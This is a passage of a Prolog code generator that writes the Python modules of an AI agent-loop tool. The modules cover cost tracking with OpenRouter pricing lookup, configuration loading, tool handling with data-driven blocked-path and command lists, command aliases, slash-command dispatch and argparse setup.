                    "output_tokens": r.output_tokens,
                    "input_cost": r.input_cost,
                    "output_cost": r.output_cost,
                    "total_cost": r.total_cost
                }
                for r in self.records
            ]
        }

    def save(self, path: str | Path) -> None:
        """Save cost data to JSON file."""
        path = Path(path)
        path.write_text(json.dumps(self.to_dict(), indent=2))

    @classmethod
    def load(cls, path: str | Path) -> "CostTracker":
        """Load cost data from JSON file."""
        path = Path(path)
        data = json.loads(path.read_text())
        tracker = cls()
        for r in data.get("records", []):
            record = UsageRecord(
                timestamp=r["timestamp"],
                model=r["model"],
                input_tokens=r["input_tokens"],
                output_tokens=r["output_tokens"],
                input_cost=r["input_cost"],
                output_cost=r["output_cost"],
                total_cost=r["total_cost"]
            )
            tracker.records.append(record)
            tracker.total_input_tokens += record.input_tokens
            tracker.total_output_tokens += record.output_tokens
            tracker.total_cost += record.total_cost
        return tracker

    def set_pricing(self, model: str, input_price: float, output_price: float) -> None:
        """Set custom pricing for a model (per 1M tokens)."""
        self.pricing[model] = {"input": input_price, "output": output_price}

    def ensure_pricing(self, model: str) -> bool:
        """Ensure pricing exists for a model. Fetch from OpenRouter if needed."""
        if model in self.pricing:
            return True
        pricing = fetch_openrouter_pricing(model)
        if pricing:
            self.pricing[model] = pricing
            return True
        return False


').

py_fragment(cost_openrouter, '# --- OpenRouter pricing ---

_OPENROUTER_CACHE_DIR = Path(os.environ.get(
    \'AGENT_LOOP_CACHE\', os.path.expanduser(\'~/.agent-loop/cache\')
))
_OPENROUTER_CACHE_FILE = _OPENROUTER_CACHE_DIR / \'openrouter_pricing.json\'
_OPENROUTER_CACHE_TTL = 86400  # 1 day


def _load_openrouter_cache() -> dict | None:
    """Load cached OpenRouter pricing if fresh enough."""
    try:
        if not _OPENROUTER_CACHE_FILE.exists():
            return None
        age = time.time() - _OPENROUTER_CACHE_FILE.stat().st_mtime
        if age > _OPENROUTER_CACHE_TTL:
            return None
        return json.loads(_OPENROUTER_CACHE_FILE.read_text())
    except Exception:
        return None


def _save_openrouter_cache(pricing: dict) -> None:
    """Save OpenRouter pricing to cache."""
    try:
        _OPENROUTER_CACHE_DIR.mkdir(parents=True, exist_ok=True)
        _OPENROUTER_CACHE_FILE.write_text(json.dumps(pricing))
    except Exception:
        pass


def fetch_openrouter_pricing(model_id: str) -> dict | None:
    """Fetch pricing for a model from OpenRouter\'s API."""
    cache = _load_openrouter_cache()
    if cache and model_id in cache:
        return cache[model_id]
    try:
        req = Request(
            \'https://openrouter.ai/api/v1/models\',
            headers={\'Content-Type\': \'application/json\'}
        )
        with urlopen(req, timeout=10) as resp:
            data = json.loads(resp.read().decode())
    except (URLError, json.JSONDecodeError, OSError) as e:
        print(f"  [OpenRouter pricing fetch failed: {e}]", file=sys.stderr)
        return None
    pricing_cache = {}
    for m in data.get(\'data\', []):
        mid = m.get(\'id\', \'\')
        p = m.get(\'pricing\', {})
        prompt_per_token = float(p.get(\'prompt\', \'0\') or \'0\')
        completion_per_token = float(p.get(\'completion\', \'0\') or \'0\')
        pricing_cache[mid] = {
            \'input\': round(prompt_per_token * 1_000_000, 4),
            \'output\': round(completion_per_token * 1_000_000, 4),
        }
    _save_openrouter_cache(pricing_cache)
    return pricing_cache.get(model_id)
').

generate_costs :-
    output_path(python, 'costs.py', CostsPath),
    open(CostsPath, write, S),
    %% Header and imports (declarative via generator_import_specs)
    write(S, '"""Cost tracking for API usage."""\n\n'),
    agent_loop_components:generator_import_specs(costs, CostsImports),
    agent_loop_components:emit_import_specs(S, CostsImports),
    write(S, '\n\n'),
    %% Binding metadata for this file
    agent_loop_bindings:emit_binding_metadata_comment(S, python, model_pricing/3),
    agent_loop_bindings:emit_binding_equivalence_comments(S, python, [
        model_pricing(_, _, _)
    ]),
    nl(S),
    %% DEFAULT_PRICING dict — binding-driven + component-driven emission
    write(S, '# Pricing per 1M tokens (auto-generated from Prolog facts)\n'),
    agent_loop_components:emit_py_dict_from_components(S, agent_costs, model_pricing/3, python, []),
    write(S, '\n\n'),
    %% Classes and methods (declarative via py_fragments)
    write_py(S, cost_usage_record),
    write_py(S, cost_tracker_class_def),
    write_py(S, cost_tracker_methods),
    write_py(S, cost_openrouter),
    close(S),
    format('  Generated costs.py~n', []).

%% =============================================================================
%% Generator: tools_generated.py (unchanged from before)
%% =============================================================================

generate_tools :-
    output_path(python, 'tools_generated.py', TGPath),
    open(TGPath, write, S),
    write(S, '"""Auto-generated tool definitions from Prolog specs."""\n\n'),
    %% Binding metadata for this file
    agent_loop_bindings:emit_binding_metadata_comment(S, python, tool_handler/2),
    agent_loop_bindings:emit_binding_metadata_comment(S, python, destructive_tool/1),
    nl(S),
    agent_loop_components:emit_py_dict_from_components(S, agent_tools, tool_handler/2, python,
        [fact_type(tool_spec), dict_name('TOOL_SPECS')]),
    nl(S),
    agent_loop_components:emit_py_set_from_components(S, agent_tools, destructive_tool/1, python,
        [fact_type(destructive_tool)]),
    close(S),
    format('  Generated tools_generated.py~n', []).


%% =============================================================================
%% Generator: context.py
%% =============================================================================

generate_context :-
    output_path(python, 'context.py', CtxPath),
    open(CtxPath, write, S),
    %% Header and imports (declarative via generator_import_specs)
    write(S, '"""Context manager for conversation history."""\n\n'),
    agent_loop_components:generator_import_specs(context, ContextImports),
    agent_loop_components:emit_import_specs(S, ContextImports),
    write(S, '\n\n'),
    %% Generate enums from context_enum/3 facts
    agent_loop_components:emit_context_enums(S, [target(python)]),
    %% Generate Message dataclass from message_field/3 facts
    write(S, '@dataclass\nclass Message:\n    """A single message in the conversation."""\n'),
    agent_loop_components:emit_message_fields(S, [target(python)]),
    write(S, '\n\n'),
    %% Helper functions (imperative — embedded)
    write_py(S, context_helpers),
    write(S, '\n\n'),
    %% ContextManager class (imperative — embedded)
    write_py(S, context_manager_class),
    write(S, '\n'),
    close(S),
    format('  Generated context.py~n', []).

%% =============================================================================
%% Generator: config.py
%% =============================================================================

generate_config :-
    output_path(python, 'config.py', CfgPath),
    open(CfgPath, write, S),
    %% Header and imports (declarative via generator_import_specs)
    write(S, '"""Configuration system for agent loop variants."""\n\n'),
    agent_loop_components:generator_import_specs(config, ConfigImports),
    agent_loop_components:emit_import_specs(S, ConfigImports),
    write(S, '\n\n'),
    %% Binding metadata for this file
    agent_loop_bindings:emit_binding_metadata_comment(S, python, api_key_env_var/2),
    agent_loop_bindings:emit_binding_metadata_comment(S, python, api_key_file/2),
    agent_loop_bindings:emit_binding_metadata_comment(S, python, default_agent_preset/3),
    agent_loop_bindings:emit_binding_metadata_comment(S, python, config_search_path/2),
    nl(S),
    %% Config cascade function (generated from config_search_path/3 facts)
    generate_config_cascade(S),
    write(S, '\n\n'),
    %% resolve_api_key with data-driven env vars and file paths
    write_py(S, config_resolve_api_key_header),
    %% Generate env_vars dict from api_key_env_var/2 facts
    write(S, '    env_vars = {\n'),
    agent_loop_components:emit_config_section(S, api_key_env_vars, [target(python)]),
    write(S, '    }\n'),
    write_py(S, config_resolve_api_key_middle),
    %% Generate file_locations dict from api_key_file/2 facts
    write(S, '    file_locations = {\n'),
    agent_loop_components:emit_config_section(S, api_key_files, [target(python)]),
    write(S, '    }\n'),
    write_py(S, config_resolve_api_key_footer),
    write(S, '\n'),
    %% YAML import guard
    write(S, '# Try to import yaml, fall back to JSON only\n'),
    write(S, 'try:\n    import yaml\n    HAS_YAML = True\n'),
    write(S, 'except ImportError:\n    HAS_YAML = False\n\n\n'),
    %% Generate AgentConfig dataclass from agent_config_field/4 facts
    write(S, '@dataclass\nclass AgentConfig:\n    """Configuration for an agent variant."""\n'),
    agent_loop_components:emit_agent_config_fields(S, [target(python)]),
    write(S, '\n\n'),
    %% Config dataclass (simple, inline)
    agent_loop_components:write_lines(S, [
        '@dataclass',
        'class Config:',
        '    """Root configuration with multiple agent variants."""',
        '    default: str = "default"',
        '    agents: dict[str, AgentConfig] = field(default_factory=dict)',
        '',
        '    # Global settings',
        '    config_dir: str = ""',
        '    skills_dir: str = ""', '', ''
    ]),
    %% _resolve_env_var (imperative fragment)
    write_py(S, config_resolve_env_var),
    write(S, '\n'),
    %% _load_agent_config (generated from agent_config_field/4 facts)
    generate_load_agent_config(S),
    %% load_config (imperative fragment)
    write_py(S, config_load_config),
    %% load_config_from_dir (generated from config_dir_file_name/1 facts)
    write(S, '\n'),
    generate_load_config_from_dir(S),
    write(S, '\n\n'),
    %% get_default_config — data-driven from default_agent_preset/3 facts
    write(S, 'def get_default_config() -> Config:\n'),
    write(S, '    """Get a default configuration with common presets."""\n'),
    write(S, '    config = Config()\n\n'),
    agent_loop_components:emit_config_section(S, default_presets, [target(python)]),
    write(S, '    return config\n\n\n'),
    %% save_example_config (generated from example_agent_config/3 facts)
    generate_config_save_example(S),
    write(S, '\n'),
    close(S),
    format('  Generated config.py~n', []).

%% --- Generator: save_example_config (from example_agent_config/3 facts) ---

generate_config_save_example(S) :-
    write(S, 'def save_example_config(path: str | Path):\n'),
    write(S, '    """Save an example configuration file."""\n'),
    write(S, '    path = Path(path)\n\n'),
    write(S, '    example = {\n'),
    write(S, '        "default": "claude-sonnet",\n'),
    write(S, '        "skills_dir": "./skills",\n'),
    write(S, '        "agents": {\n'),
    findall(cfg(N,B,P), example_agent_config(N, B, P), Configs),
    generate_example_agents(S, Configs),
    write(S, '        }\n'),
    write(S, '    }\n'),
    write_py(S, config_save_example_tail).

generate_example_agents(_, []).
generate_example_agents(S, [cfg(Name, Backend, Props)]) :-
    generate_one_example_agent(S, Name, Backend, Props, last).
generate_example_agents(S, [cfg(Name, Backend, Props)|Rest]) :-
    Rest \= [],
    generate_one_example_agent(S, Name, Backend, Props, notlast),
    generate_example_agents(S, Rest).

generate_one_example_agent(S, Name, Backend, Props, LastFlag) :-
    format(S, '            "~w": {~n', [Name]),
    format(S, '                "backend": "~w"', [Backend]),
    %% Emit remaining properties
    generate_example_props(S, Props),
    (LastFlag = last ->
        write(S, '\n            }\n')
    ;
        write(S, '\n            },\n')
    ).

generate_example_props(_, []).
generate_example_props(S, [Key=Value|Rest]) :-
    write(S, ',\n'),
    generate_one_example_prop(S, Key, Value),
    generate_example_props(S, Rest).

generate_one_example_prop(S, Key, true) :-
    format(S, '                "~w": True', [Key]).
generate_one_example_prop(S, Key, false) :-
    format(S, '                "~w": False', [Key]).
generate_one_example_prop(S, Key, Value) :-
    integer(Value),
    format(S, '                "~w": ~w', [Key, Value]).
generate_one_example_prop(S, Key, Value) :-
    is_list(Value),
    format(S, '                "~w": [', [Key]),
    generate_json_string_list(S, Value),
    write(S, ']').
generate_one_example_prop(S, Key, Value) :-
    atom(Value), Value \= true, Value \= false,
    format(S, '                "~w": "~w"', [Key, Value]).
generate_one_example_prop(S, Key, Value) :-
    string(Value),
    format(S, '                "~w": "~w"', [Key, Value]).

generate_json_string_list(_, []).
generate_json_string_list(S, [X]) :-
    format(S, '"~w"', [X]).
generate_json_string_list(S, [X|Xs]) :-
    Xs \= [],
    format(S, '"~w", ', [X]),
    generate_json_string_list(S, Xs).

%% --- Generator: _load_agent_config (from agent_config_field/4 facts) ---

generate_load_agent_config(S) :-
    write(S, 'def _load_agent_config(name: str, data: dict) -> AgentConfig:\n'),
    write(S, '    """Load an agent config from a dictionary."""\n'),
    write(S, '    if \'api_key\' in data:\n'),
    write(S, '        data[\'api_key\'] = _resolve_env_var(data[\'api_key\'])\n\n'),
    write(S, '    return AgentConfig(\n'),
    %% Collect all fields in order
    findall(F, agent_config_field(F, _, _, _), Fields),
    generate_agent_config_fields(S, Fields),
    write(S, '    )\n').

generate_agent_config_fields(_, []).
generate_agent_config_fields(S, [Field|Rest]) :-
    (Rest = [] -> Comma = '' ; Comma = ','),
    generate_one_config_field(S, Field, Comma),
    generate_agent_config_fields(S, Rest).

generate_one_config_field(S, Field, Comma) :-
    (config_field_json_default(Field, positional) ->
        %% Positional field — pass directly
        format(S, '        ~w=~w~w~n', [Field, Field, Comma])
    ; config_field_json_default(Field, no_default) ->
        %% No default — data.get('field') returns None
        format(S, '        ~w=data.get(\'~w\')~w~n', [Field, Field, Comma])
    ; config_field_json_default(Field, JsonDefault) ->
        %% Explicit JSON default
        format(S, '        ~w=data.get(\'~w\', ~w)~w~n', [Field, Field, JsonDefault, Comma])
    ;
        %% Use the dataclass default directly
        agent_config_field(Field, _, Default, _),
        format(S, '        ~w=data.get(\'~w\', ~w)~w~n', [Field, Field, Default, Comma])
    ).

%% --- Generator: read_config_cascade (from config_search_path/3 facts) ---

%% --- Generator: load_config_from_dir (from config_dir_file_name/1 facts) ---

generate_load_config_from_dir(S) :-
    write(S, 'def load_config_from_dir(dir_path: str | Path = None) -> Config | None:\n'),
    write(S, '    """Load config from standard locations in a directory."""\n'),
    write(S, '    if dir_path is None:\n'),
    write(S, '        dir_path = Path.cwd()\n'),
    write(S, '    else:\n'),
    write(S, '        dir_path = Path(dir_path)\n\n'),
    %% Generate the file name list from facts
    findall(N, config_dir_file_name(N), Names),
    write(S, '    for name in ['),
    generate_config_dir_names(S, Names),
    write(S, ']:\n'),
    write_py(S, config_load_from_dir_footer).

generate_config_dir_names(_, []).
generate_config_dir_names(S, [Name]) :-
    format(S, '\'~w\'', [Name]).
generate_config_dir_names(S, [Name|Rest]) :-
    Rest \= [],
    %% Add line continuation after 3rd element (matching prototype formatting)
    (Rest = [_, _, _] ->
        format(S, '\'~w\',~n                 ', [Name])
    ;
        format(S, '\'~w\', ', [Name])
    ),
    generate_config_dir_names(S, Rest).

generate_config_cascade(S) :-
    write(S, 'def read_config_cascade(no_fallback: bool = False) -> dict:\n'),
    write(S, '    """Read config from uwsal.json, falling back to coro.json."""\n'),
    write(S, '    candidates = [\n'),
    agent_loop_components:emit_cascade_paths(S, [path_type(required), indent('')]),
    write(S, '    ]\n'),
    write(S, '    if not no_fallback:\n'),
    write(S, '        candidates += [\n'),
    agent_loop_components:emit_cascade_paths(S, [path_type(fallback), indent('    ')]),
    write(S, '        ]\n'),
    write(S, '    for path in candidates:\n'),
    write(S, '        try:\n'),
    write(S, '            with open(path) as f:\n'),
    write(S, '                return json.load(f)\n'),
    write(S, '        except (FileNotFoundError, json.JSONDecodeError):\n'),
    write(S, '            continue\n'),
    write(S, '    return {}\n').

generate_cascade_path_entry(S, Path, ExtraIndent) :-
    (atom_concat('~/', _, Path) ->
        format(S, '    ~w    os.path.expanduser(\'~w\'),~n', [ExtraIndent, Path])
    ;
        format(S, '    ~w    \'~w\',~n', [ExtraIndent, Path])
    ).

%% =============================================================================
%% Generator: display.py
%% =============================================================================

generate_display :-
    output_path(python, 'display.py', DispPath),
    open(DispPath, write, S),
    write_py(S, display_module),
    close(S),
    format('  Generated display.py~n', []).

%% =============================================================================
%% Generator: tools.py (main tools module, not tools_generated.py)
%% =============================================================================

generate_tools_module :-
    output_path(python, 'tools.py', ToolsPath),
    open(ToolsPath, write, S),
    write(S, '"""Tool handler for executing agent tool calls."""\n\n'),
    agent_loop_components:generator_import_specs(tools, ToolImports),
    agent_loop_components:emit_import_specs(S, ToolImports),
    write(S, '\n'),
    agent_loop_bindings:emit_binding_equivalence_comments(S, python, [
        tool_handler(_, _), destructive_tool(_)
    ]),
    write(S, '\n'),
    %% ToolResult dataclass
    write(S, '@dataclass\nclass ToolResult:\n    """Result of executing a tool."""\n'),
    write(S, '    success: bool\n    output: str\n    tool_name: str\n\n\n'),
    %% Path validation — data-driven blocked lists
    write(S, '# ── Path validation ────────────────────────────────────────────────────────\n\n'),
    write(S, '# Sensitive paths that should never be accessed by agent tools\n'),
    write(S, '_BLOCKED_PATHS = {\n'),
    agent_loop_components:emit_security_facts(S, [target(python), fact_type(blocked_path)]),
    write(S, '}\n'),
    write(S, '_BLOCKED_PREFIXES = (\n'),
    agent_loop_components:emit_security_facts(S, [target(python), fact_type(blocked_path_prefix)]),
    write(S, ')\n'),
    write(S, '_BLOCKED_HOME_PATTERNS = (\n'),
    agent_loop_components:emit_security_facts(S, [target(python), fact_type(blocked_home_pattern)]),
    write(S, ')\n\n\n'),
    %% validate_path function (imperative)
    write_py(S, tools_validate_path),
    write(S, '\n\n'),
    %% Command blocklist — data-driven
    write(S, '# ── Command blocklist ──────────────────────────────────────────────────────\n\n'),
    write(S, '_BLOCKED_COMMAND_PATTERNS = [\n'),
    agent_loop_components:emit_security_facts(S, [target(python), fact_type(blocked_command_pattern)]),
    write(S, ']\n\n\n'),
    %% is_command_blocked (imperative)
    write_py(S, tools_is_command_blocked),
    write(S, '\n\n'),
    %% SecurityConfig (imperative — has from_profile method)
    write_py(S, tools_security_config),
    write(S, '\n\n'),
    %% ToolHandler class (header + generated dispatch + body)
    findall(T, tool_handler(T, _), DefaultTools),
    format_python_string_list(DefaultTools, DefaultToolsStr),
    write_py(S, tools_handler_class_header, [default_tools=DefaultToolsStr]),
    generate_tool_dispatch(S),
    write_py(S, tools_handler_class_body),
    write(S, '\n'),
    close(S),
    format('  Generated tools.py~n', []).

%% =============================================================================
%% Generator: aliases.py (hybrid — data from command_alias/2 + class from fragment)
%% =============================================================================

generate_aliases :-
    output_path(python, 'aliases.py', AliasPath),
    open(AliasPath, write, S),
    write(S, '"""Command aliases for the agent loop."""\n\n'),
    agent_loop_components:generator_import_specs(aliases, AliasImports),
    agent_loop_components:emit_import_specs(S, AliasImports),
    write(S, '\n\n'),
    %% Binding metadata for this file
    agent_loop_bindings:emit_binding_metadata_comment(S, python, slash_command/4),
    nl(S),
    %% DEFAULT_ALIASES dict — generated from command_alias/2 facts
    write(S, '# Default aliases\nDEFAULT_ALIASES = {\n'),
    generate_aliases_dict_entries(S),
    write(S, '}\n\n\n'),
    %% AliasManager class — split fragment + generated categories dict
    write_py(S, aliases_class_header),
    generate_alias_categories_dict(S),
    write_py(S, aliases_class_footer),
    write(S, '\n\n'),
    %% create_default_aliases_file — imperative fragment
    write_py(S, aliases_create_default),
    nl(S),
    close(S),
    format('  Generated aliases.py~n', []).

%% --- Generator: categories dict for AliasManager.format_list ---

generate_alias_categories_dict(S) :-
    write(S, '        categories = {\n'),
    findall(cat(Cat, Keys), alias_category(Cat, Keys), Cats),
    generate_alias_cat_entries(S, Cats),
    write(S, '        }\n').

generate_alias_cat_entries(_, []).
generate_alias_cat_entries(S, [cat(Cat, Keys)|Rest]) :-
    format(S, '            "~w": [', [Cat]),
    generate_alias_cat_keys(S, Keys),
    write(S, '],\n'),
    generate_alias_cat_entries(S, Rest).

generate_alias_cat_keys(_, []).
generate_alias_cat_keys(S, [K]) :-
    format(S, '"~w"', [K]).
generate_alias_cat_keys(S, [K|Rest]) :-
    Rest \= [],
    format(S, '"~w", ', [K]),
    generate_alias_cat_keys(S, Rest).

%% Generate the DEFAULT_ALIASES dict entries grouped by category comments
generate_aliases_dict_entries(S) :-
    %% We need the aliases in a specific order with comments matching the prototype.
    %% Walk through alias_category/2 in order, with comment headers.
    alias_category_comment('Navigation', '    # Short forms'),
    alias_category_comment('Sessions', '    # Save/load shortcuts'),
    alias_category_comment('Export', '    # Export shortcuts'),
    alias_category_comment('Backend', '    # Backend shortcuts'),
    alias_category_comment('Iterations', '    # Iteration shortcuts'),
    alias_category_comment('Other', '    # Other shortcuts'),
    %% Now write them
    generate_alias_group(S, 'Navigation', '    # Short forms\n'),
    write(S, '\n'),
    generate_alias_group(S, 'Sessions', '    # Save/load shortcuts\n'),
    write(S, '\n'),
    generate_alias_group(S, 'Export', '    # Export shortcuts\n'),
    write(S, '\n'),
    generate_alias_group_backend(S),
    write(S, '\n'),
    generate_alias_group(S, 'Iterations', '    # Iteration shortcuts\n'),
    write(S, '\n'),
    generate_alias_group_other(S).

%% Simple category-to-comment mapping (for matching prototype output)
alias_category_comment(_, _).

%% Write aliases for a simple category
generate_alias_group(S, Category, Comment) :-
    write(S, Comment),
    agent_loop_components:emit_alias_group_entries(S, [category(Category)]).

%% Backend is special: has two sub-groups with separate comments
generate_alias_group_backend(S) :-
    write(S, '    # Backend shortcuts\n'),
    command_alias("be", BeV), format(S, '    "be": "~w",~n', [BeV]),
    command_alias("sw", SwV), format(S, '    "sw": "~w",  # switch~n', [SwV]),
    write(S, '\n'),
    write(S, '    # Common backend switches\n'),
    maplist([K]>>(
        command_alias(K, V), format(S, '    "~w": "~w",~n', [K, V])
    ), ["yolo", "opus", "sonnet", "haiku", "gpt", "local"]),
    write(S, '\n'),
    write(S, '    # Format shortcuts\n'),
    command_alias("fmt", FmtV), format(S, '    "fmt": "~w",~n', [FmtV]).

%% Other group: stream, cost, search with individual comments
generate_alias_group_other(S) :-
    write(S, '    # Stream toggle\n'),
    command_alias("str", StrV), format(S, '    "str": "~w",~n', [StrV]),
    write(S, '\n'),
    write(S, '    # Cost\n'),
    command_alias("$", CostV), format(S, '    "$": "~w",~n', [CostV]),
    write(S, '\n'),
    write(S, '    # Search\n'),
    command_alias("find", FindV), format(S, '    "find": "~w",~n', [FindV]),
    command_alias("grep", GrepV), format(S, '    "grep": "~w",~n', [GrepV]).

%% =============================================================================
%% Generator helpers: Slash command dispatch + help text
%% =============================================================================
%%
%% These generators emit Python code fragments for use inside agent_loop.py.
%% They will be wired into the hybrid generate_agent_loop_main in Step 5.
%% For now they can be tested via: generate_command_dispatch(user_output).

%% generate_command_dispatch(S) - emit the _handle_command if/elif chain
generate_command_dispatch(S) :-
    slash_command_dispatch_order(AllCmds),
    generate_command_dispatch_chain(S, AllCmds).

generate_command_dispatch_chain(_, []) :- !.
generate_command_dispatch_chain(S, [Cmd|Rest]) :-
    slash_command(Cmd, MatchType, Props, _),
    generate_single_dispatch(S, Cmd, MatchType, Props),
    write(S, '\n'),
    generate_command_dispatch_chain(S, Rest).

%% Generate a single command dispatch entry
%% Special cases: exit, clear, help, status are inline (no handler property)
generate_single_dispatch(S, exit, exact, Props) :-
    !,
    (member(aliases(Aliases), Props) -> true ; Aliases = []),
    write(S, '        if cmd == \'exit\''),
    agent_loop_components:emit_alias_conditions(S, [aliases(Aliases), match_style(exact)]),
    write(S, ':\n'),
    write(S, '            self.running = False\n'),
    write(S, '            return True\n').

generate_single_dispatch(S, clear, exact, _) :-
    !,
    write(S, '        if cmd == \'clear\':\n'),
    write(S, '            self.context.clear()\n'),
    write(S, '            self.history_manager = HistoryManager(self.context)\n'),
    write(S, '            print("[Context cleared]\\n")\n'),
    write(S, '            return True\n').

generate_single_dispatch(S, help, exact, _) :-
    !,
    write(S, '        if cmd == \'help\':\n'),
    write(S, '            self._print_help()\n'),
    write(S, '            return True\n').

generate_single_dispatch(S, status, exact, _) :-
    !,
    write(S, '        if cmd == \'status\':\n'),
    write(S, '            self._print_status()\n'),
    write(S, '            return True\n').

%% Generic exact-match command with handler
generate_single_dispatch(S, Cmd, exact, Props) :-
    member(handler(Handler), Props), !,
    (member(aliases(Aliases), Props) -> true ; Aliases = []),
    %% Emit optional comment
    (member(comment(Comment), Props) ->
        format(S, '        # ~w~n', [Comment])
    ; true),
    format(S, '        if cmd == \'~w\'', [Cmd]),
    agent_loop_components:emit_alias_conditions(S, [aliases(Aliases), match_style(exact)]),
    write(S, ':\n'),
    format(S, '            return self.~w()~n', [Handler]).

%% prefix match: cmd.startswith('name')
generate_single_dispatch(S, Cmd, prefix, Props) :-
    member(handler(Handler), Props), !,
    (member(comment(Comment), Props) ->
        format(S, '        # ~w~n', [Comment])
    ; true),
    format(S, '        if cmd.startswith(\'~w\'):~n', [Cmd]),
    format(S, '            return self.~w(text)~n', [Handler]).

%% prefix_sp match: cmd.startswith('name ') — requires space after command
generate_single_dispatch(S, Cmd, prefix_sp, Props) :-
    member(handler(Handler), Props), !,
    (member(aliases(Aliases), Props) -> true ; Aliases = []),
    (member(comment(Comment), Props) ->
        format(S, '        # ~w~n', [Comment])
    ; true),
    format(S, '        if cmd.startswith(\'~w \')', [Cmd]),
    agent_loop_components:emit_alias_conditions(S, [aliases(Aliases), match_style(prefix_sp)]),
    write(S, ':\n'),
    format(S, '            return self.~w(text)~n', [Handler]).

%% exact_or_prefix_sp match: cmd == 'name' or cmd.startswith('name ')
generate_single_dispatch(S, Cmd, exact_or_prefix_sp, Props) :-
    member(handler(Handler), Props), !,
    (member(comment(Comment), Props) ->
        format(S, '        # ~w~n', [Comment])
    ; true),
    format(S, '        if cmd == \'~w\' or cmd.startswith(\'~w \'):~n', [Cmd, Cmd]),
    format(S, '            return self.~w(text)~n', [Handler]).

%% Fallback: command with no handler (shouldn't happen, but safe)
generate_single_dispatch(_, _, _, _).

%% =============================================================================
%% Generator helpers: Per-handler fragment emission
%% =============================================================================

%% handler_fragment_name(+Handler, -FragName)
%% Converts '_handle_foo_command' to 'handler_foo_command'
handler_fragment_name(Handler, FragName) :-
    atom_concat('_handle_', Rest, Handler),
    atom_concat('handler_', Rest, FragName).

%% emit_handler_fragments(+Stream)
%% Emits per-handler py_fragments in dispatch order, separated by blank lines.
emit_handler_fragments(S) :-
    slash_command_dispatch_order(AllCmds),
    include(cmd_has_handler, AllCmds, WithHandlers),
    emit_handler_list(S, WithHandlers, first).

cmd_has_handler(Cmd) :-
    slash_command(Cmd, _, Props, _),
    member(handler(_), Props).

emit_handler_list(_, [], _) :- !.
emit_handler_list(S, [Cmd|Rest], first) :- !,
    slash_command(Cmd, _, Props, _),
    member(handler(Handler), Props),
    handler_fragment_name(Handler, FragName),
    write_py(S, FragName),
    emit_handler_list(S, Rest, not_first).
emit_handler_list(S, [Cmd|Rest], not_first) :-
    slash_command(Cmd, _, Props, _),
    member(handler(Handler), Props),
    handler_fragment_name(Handler, FragName),
    nl(S), nl(S),
    write_py(S, FragName),
    emit_handler_list(S, Rest, not_first).

%% generate_help_text(S) - emit the _print_help method body
generate_help_text(S) :-
    write(S, '    def _print_help(self) -> None:\n'),
    write(S, '        """Print help message."""\n'),
    write(S, '        print("""\n'),
    %% Generate help text from slash_command_group/2 and slash_command/4
    agent_loop_components:emit_help_groups(S, [target(python)]),
    %% Multi-line input section (static, not data-driven)
    write(S, 'Multi-line Input:\n'),
    write(S, '  Start with ``` for code blocks\n'),
    write(S, '  Start with <<< for heredoc mode\n'),
    write(S, '  End lines with \\\\ for continuation\n'),
    write(S, '\nJust type your message to chat with the agent.\n'),
    write(S, '""")\n').

%% is_python_command(+CmdName) — true if command is NOT Prolog-only
is_python_command(CmdName) :-
    slash_command(CmdName, _, Props, _),
    \+ member(target(prolog), Props).

%% Format help line(s) from slash_command/4
%% If help_lines property exists, emit those verbatim (multi-line entries like /delete)
format_help_line(S, CmdName) :-
    slash_command(CmdName, _, Props, _),
    member(help_lines(Lines), Props), !,
    maplist([Line]>>(format(S, '  ~w~n', [Line])), Lines).

%% Normal single-line help entry
format_help_line(S, CmdName) :-
    slash_command(CmdName, _, Props, HelpText),
    %% Use help_display if provided, otherwise auto-build from name + aliases
    (member(help_display(CmdDisplay), Props) ->
        true
    ;
        atom_string(CmdName, CmdStr),
        atom_concat('/', CmdStr, CmdDisplay)
    ),
    %% Format: "  /cmd            - Help text"  (column 19 = dash)
    atom_length(CmdDisplay, Len),
    PadLen is max(1, 19 - Len),
    format(S, '  ~w', [CmdDisplay]),
    format(S, '~*c', [PadLen, 0' ]),
    format(S, '- ~w~n', [HelpText]).

%% =============================================================================
%% Generator helpers: Argparse block
%% =============================================================================

%% generate_argparse_block(S) - emit all parser.add_argument() calls grouped
generate_argparse_block(S) :-
    findall(GroupComment-ArgNames, cli_argument_group(GroupComment, ArgNames), Groups),
    generate_argparse_groups(S, Groups, first).

generate_argparse_groups(_, [], _) :- !.
generate_argparse_groups(S, [GroupComment-ArgNames|Rest], first) :- !,
    %% First group: no leading blank line
    format(S, '    # ~w~n', [GroupComment]),
    agent_loop_components:emit_argparse_group_args(S, [args(ArgNames)]),
    generate_argparse_groups(S, Rest, not_first).
generate_argparse_groups(S, [GroupComment-ArgNames|Rest], not_first) :-
    format(S, '~n    # ~w~n', [GroupComment]),
    agent_loop_components:emit_argparse_group_args(S, [args(ArgNames)]),
    generate_argparse_groups(S, Rest, not_first).

%% generate_add_argument(S, Props) - emit a single parser.add_argument(...)
generate_add_argument(S, Props) :-
    write(S, '    parser.add_argument(\n'),
    %% First: positional name or flag names
    (member(positional(true), Props) ->
        %% Positional argument — emit name from long if present
        (member(long(Long), Props) ->
            format(S, '        \'~w\',~n', [Long])
        ; true)
    ; member(short_first(true), Props) ->
        %% Short flag first (e.g., '-I', '--prompt-interactive')
        member(short(Short), Props),
        member(long(Long), Props),
        format(S, '        \'~w\', \'~w\',~n', [Short, Long])
    ;
        %% Normal: long flag first, optional short
        (member(short(Short), Props) ->
            member(long(Long), Props),
            format(S, '        \'~w\', \'~w\',~n', [Long, Short])
        ;
            member(long(Long), Props),
            format(S, '        \'~w\',~n', [Long])
        )
    ),
    %% Keyword args in prototype order: type, action, nargs, choices, default, metavar, help
    (member(type(Type), Props) ->
        format(S, '        type=~w,~n', [Type])
    ; true),
    (member(action(Act), Props) ->
        format(S, '        action=\'~w\',~n', [Act])
    ; true),
    (member(nargs(Nargs), Props) ->
        format(S, '        nargs=\'~w\',~n', [Nargs])
    ; true),
    (member(choices(Choices), Props) ->
        write(S, '        choices=['),
        format_choices_list(S, Choices),
        write(S, '],\n')
    ; true),
    (member(default(Def), Props) ->
        format_default(S, Def)
    ; true),
    (member(metavar(Meta), Props) ->
        format(S, '        metavar=\'~w\',~n', [Meta])
    ; true),
    %% Help text (always last)
    (member(help(Help), Props) ->
        format(S, '        help=\'~w\'~n', [Help])
    ; true),
    write(S, '    )\n').

%% Format default value for Python
format_default(S, none) :- !,
    write(S, '        default=None,\n').
format_default(S, []) :- !,
    write(S, '        default=[],\n').
format_default(S, N) :- integer(N), !,
    format(S, '        default=~w,~n', [N]).
format_default(S, Val) :-
    format(S, '        default=\'~w\',~n', [Val]).

%% Format a choices list for Python
format_choices_list(_, []) :- !.
format_choices_list(S, [Last]) :- !,
